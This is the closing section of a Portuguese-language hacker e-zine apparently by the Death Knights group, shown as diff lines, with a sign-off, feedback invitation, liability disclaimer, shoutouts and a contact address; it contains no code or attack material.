+     `'`'`'               `'`'`'`'`'`'`'`'`'`'`'`
+
+-=[  20  ]=-
+.------------------.
+| Ultimas Palavras  \________________________________________________________
+`----------------------------------------------------------------------------'
+                                 by Cacaio
+
+        Se voce quiser mandar um e-mail dizendo o que achou do zine, dar su-
+        gestoes, reclamar, elogiar, meter o pau, colocar alguma materia,
+        conversar, ganhar dinheiro, jogar futebol.. ops.. aih nao... algo
+        errado... mas mesmo assim, esteja a vontade.
+
+        AVISO NOVAMENTE:
+
+        Este grupo nao visa nenhum fim lucrativo. Mas se ganharmos alguma
+        coisinha nao reclamaremos. heh. Nos fazemos isto por diversao e
+        nada mais. Qualquer uso das informacoes contidas aqui nao e de nossa
+        responsabilidade. Se voce fizer algo descrito e se der mal, problema
+        seu. Nos ensinamos, mas nao pedimos para usarem o conhecimento
+        adquirido com este zine.
+
+Shoutz: [rde] [Erica_21] [HUnter^hEAds] [aghi] [Athena] [brody] [rw] [d3xt3r]
+                      [Cheat Struck] [_TINA_] [RickRock]
+
+        Ate o proximo numero!
+
+ ______________________________Death_Knights_________________________________
+ ----------------------------------------------------------------------------
+
+                            Criticas? Sugestoes?
+
+                           death@DeathKnights.com
